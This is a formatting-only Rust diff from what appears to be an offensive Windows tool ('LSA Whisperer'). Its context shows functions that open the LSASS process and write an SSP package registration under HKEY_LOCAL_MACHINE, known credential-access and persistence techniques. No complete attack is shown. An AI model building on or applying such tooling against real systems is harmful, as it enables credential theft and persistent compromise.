@@ -1074,7 +1074,9 @@ pub fn open_lsass_process() -> Result<usize> {
         ));
     }
 
-    tracing::info!("LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})");
+    tracing::info!(
+        "LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})"
+    );
 
     Ok(process_handle)
 }
@@ -1379,7 +1381,8 @@ pub fn register_ssp_package() -> Result<()> {
             windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
             key_wide.as_ptr(),
             0,
-            windows_sys::Win32::System::Registry::KEY_QUERY_VALUE | windows_sys::Win32::System::Registry::KEY_SET_VALUE,
+            windows_sys::Win32::System::Registry::KEY_QUERY_VALUE
+                | windows_sys::Win32::System::Registry::KEY_SET_VALUE,
             &mut hkey,
         )
     };
